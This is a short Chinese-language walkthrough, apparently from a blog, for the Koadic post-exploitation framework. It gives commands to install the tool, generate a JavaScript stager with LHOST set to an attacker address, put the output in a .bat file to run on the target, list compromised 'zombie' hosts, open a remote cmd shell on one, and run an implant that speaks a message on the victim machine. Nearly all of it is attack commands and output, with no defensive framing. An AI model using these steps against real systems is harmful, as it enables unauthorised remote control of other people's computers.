项目地址：https://github.com/zerosum0x0/koadic  

  

| `┌─[root@sch01ar]─[``/sch01ar``]``└──╼ ``#git clone https://github.com/zerosum0x0/koadic` |
| --- |

  

下载后打开并安装所需的包

  

| `┌─[root@sch01ar]─[``/sch01ar/koadic``]``└──╼ ``#pip install -r requirements.txt` |
| --- |

  

安装完成后启动程序

  

| `┌─[root@sch01ar]─[``/sch01ar/koadic``]``└──╼ ``#./koadic ` |
| --- |

  

![](../Images/7f980cae946fb064d75611c2b5e82a0d.png)

  

输入use和空格然后连按两下Tab键查看模块

  

![](../Images/4ad218f56b3cc4398747899226c5f7d3.png)

  

stager开头的模块是用来反弹主机的，implant开头的模块是用来对反弹的主机

  

进行操作

  

选择stager/js/disk进行测试

  

| `(koadic: sta``/js/mshta``)``# use stager/js/disk` |
| --- |

  

![](../Images/f0eaf9fe09ae4d2ef9e30251f2413ede.png)

  

查看配置信息

  

  

| `(koadic: sta``/js/disk``)``# info` |
| --- |

  

  

![](../Images/72824b82616c89ea55b19c9cb726c2c9.png)

  

设置lhost

  

| `(koadic: sta``/js/disk``)``# set LHOST 192.168.220.132` |
| --- |

  

![](../Images/34199f4f954db81a769635b56067e78e.png)

  

然后run

  

| `(koadic: sta``/js/disk``)``# run` |
| --- |

  

![](../Images/0ec7d95b0b3001bda94736929163449a.png)

然后把\[>\]后的东西写到一个bat文件里，放到目标主机打开

  

注：stager开头的模块都是一样的操作

  

得到目标主机的反弹

  

![](../Images/32579a2d3d68156f13a496af4b89798e.png)

  

查看僵尸主机列表

  

| `(koadic: sta``/js/disk``)``# zombies` |
| --- |

  

![](../Images/489461b4c7613f0acfcabfc87fc380b9.png)

  

注：此目标主机的ID为0

  

执行cmd命令，0为主机的ID

  

  

| `(koadic: sta``/js/disk``)``# cmdshell 0` |
| --- |

  

| `[koadic: ZOMBIE 0 (192.168.220.129) - cmd.exe]> ``whoami` |
| --- |

  

![](../Images/c58f368eb1e088d131cb694228566fb6.png)

  

该上implant模块了

  

  

| `(koadic: sta``/js/disk``)``# use implant/fun/voice` |
| --- |

  

  

![](../Images/1ee53b1022cfa152c1c7f687c1f852cf.png)

  

这个MESSAGE随便你设置，然后run

  

![](../Images/10655f6bb58118f6eb31df2c8b39d418.png)

  

将会在目标主机朗读MESSAGE的内容
